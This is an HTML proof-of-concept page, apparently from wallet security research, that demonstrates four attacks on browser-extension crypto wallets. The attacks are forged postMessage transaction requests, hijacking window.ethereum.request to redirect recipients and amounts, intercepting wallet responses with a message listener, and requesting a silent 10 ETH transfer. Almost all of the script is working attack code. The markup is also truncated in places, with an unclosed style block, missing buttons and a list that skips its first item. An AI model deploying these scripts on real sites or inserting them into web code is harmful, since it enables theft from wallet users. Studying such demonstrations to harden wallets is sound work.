    <style>

<body>
    <div class="container">
        <h1>🎯 PoC #7: Provider Injection Attack</h1>
        
        <div class="warning">
            <strong>⚠️ SECURITY RESEARCH DEMONSTRATION</strong><br>
            This page demonstrates how malicious websites can exploit insecure
            message passing in browser extension wallets.
        </div>

        <div class="attack-section">
            <h2>Attack Vectors</h2>
            
            <button onclick="attack1_directPostMessage()">
                Attack 1: Direct postMessage() Injection

    <script>
        const log = document.getElementById('attackLog');
        
        function addLog(message, type = 'info') {
            const entry = document.createElement('div');
            entry.className = `log-entry log-${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            log.appendChild(entry);
            log.scrollTop = log.scrollHeight;
        }

        // Attack 1: Direct postMessage() to extension
        function attack1_directPostMessage() {
            addLog('🎯 ATTACK 1: Direct postMessage() Injection', 'warning');
            
            // Craft malicious message
            const maliciousMessage = {
                type: 'VERIFIED_WALLET_REQUEST',
                method: 'eth_sendTransaction',
                params: [{
                    from: '0xVictimAddress',
                    to: '0x000000000000000000000000000000000000dEaD',
                    value: '0x8AC7230489E80000', // 10 ETH
                    gas: '0x5208'
                }],
                id: Math.random()
            };
            
            addLog('Crafting malicious transaction...', 'info');
            addLog(`To: ${maliciousMessage.params[0].to}`, 'info');
            addLog(`Value: 10 ETH`, 'info');
            
            // Send to all possible extension origins
            const extensionOrigins = [
                'chrome-extension://*',
                'moz-extension://*',
                window.location.origin
            ];
            
            addLog('Sending postMessage() to extension...', 'warning');
            
            try {
                window.postMessage(maliciousMessage, '*');
                addLog('✓ Message sent successfully', 'info');
                addLog('⚠️ If extension lacks origin validation, TX will be signed!', 'error');
            } catch (e) {
                addLog(`✗ Error: ${e.message}`, 'error');
            }
        }

        // Attack 2: Provider object manipulation
        function attack2_providerManipulation() {
            addLog('🎯 ATTACK 2: Provider Object Manipulation', 'warning');
            
            // Check if provider exists
            if (window.ethereum) {
                addLog('✓ window.ethereum detected', 'info');
                
                // Try to manipulate provider
                addLog('Attempting to override request method...', 'warning');
                
                const originalRequest = window.ethereum.request;
                
                window.ethereum.request = async function(args) {
                    addLog(`Intercepted request: ${args.method}`, 'warning');
                    
                    // Modify transaction parameters
                    if (args.method === 'eth_sendTransaction') {
                        addLog('🎯 Transaction detected! Modifying...', 'error');
                        args.params[0].to = '0x000000000000000000000000000000000000dEaD';
                        args.params[0].value = '0x8AC7230489E80000'; // 10 ETH
                        addLog('✓ Recipient changed to attacker address', 'error');
                    }
                    
                    return originalRequest.call(this, args);
                };
                
                addLog('✓ Provider hijacked successfully', 'error');
                addLog('⚠️ All future transactions will be modified!', 'error');
            } else {
                addLog('✗ window.ethereum not found', 'info');
                addLog('Extension may not be installed or provider not injected', 'info');
            }
        }

        // Attack 3: Event listener hijacking
        function attack3_eventListenerHijack() {
            addLog('🎯 ATTACK 3: Event Listener Hijacking', 'warning');
            
            // Hijack message event listener
            addLog('Installing malicious message listener...', 'warning');
            
            window.addEventListener('message', function(event) {
                // Check if this is a response from extension
                if (event.data && event.data.type === 'VERIFIED_WALLET_RESPONSE') {
                    addLog('🎯 Extension response intercepted!', 'error');
                    addLog(`Data: ${JSON.stringify(event.data).substring(0, 100)}...`, 'info');
                    
                    // Extract sensitive data
                    if (event.data.result) {
                        addLog('✓ Sensitive data extracted', 'error');
                        addLog('⚠️ This could include signed transactions, addresses, etc.', 'error');
                    }
                }
            });
            
            addLog('✓ Listener installed', 'error');
            addLog('⚠️ Now monitoring all extension responses', 'error');
        }

        // Attack 4: Silent transaction signing
        function attack4_silentSigning() {
            addLog('🎯 ATTACK 4: Silent Transaction Signing', 'warning');
            
            if (!window.ethereum) {
                addLog('✗ window.ethereum not found', 'error');
                return;
            }
            
            addLog('Attempting silent transaction...', 'warning');
            
            const maliciousTx = {
                from: '0xVictimAddress', // Will be replaced by extension
                to: '0x000000000000000000000000000000000000dEaD',
                value: '0x8AC7230489E80000', // 10 ETH
                gas: '0x5208',
                gasPrice: '0xBA43B7400' // 50 gwei
            };
            
            addLog('Transaction details:', 'info');
            addLog(`  To: ${maliciousTx.to}`, 'info');
            addLog(`  Value: 10 ETH`, 'info');
            
            // Attempt to send without user seeing proper UI
            window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [maliciousTx]
            })
            .then(txHash => {
                addLog('✓ TRANSACTION SIGNED!', 'error');
                addLog(`TX Hash: ${txHash}`, 'error');
                addLog('⚠️ Funds stolen successfully!', 'error');
            })
            .catch(err => {
                addLog(`✗ Transaction rejected: ${err.message}`, 'info');
                addLog('Extension may have proper validation', 'info');
            });
        }

        // Auto-run demonstration
        addLog('Page loaded - Extension provider injection attack ready', 'warning');
        addLog('Click buttons above to demonstrate attack vectors', 'info');
        addLog('', 'info');
        addLog('VULNERABILITIES DEMONSTRATED:', 'warning');

        addLog('2. Provider object can be manipulated', 'error');
        addLog('3. Event listeners can intercept responses', 'error');
        addLog('4. Silent signing without proper UI', 'error');
    </script>
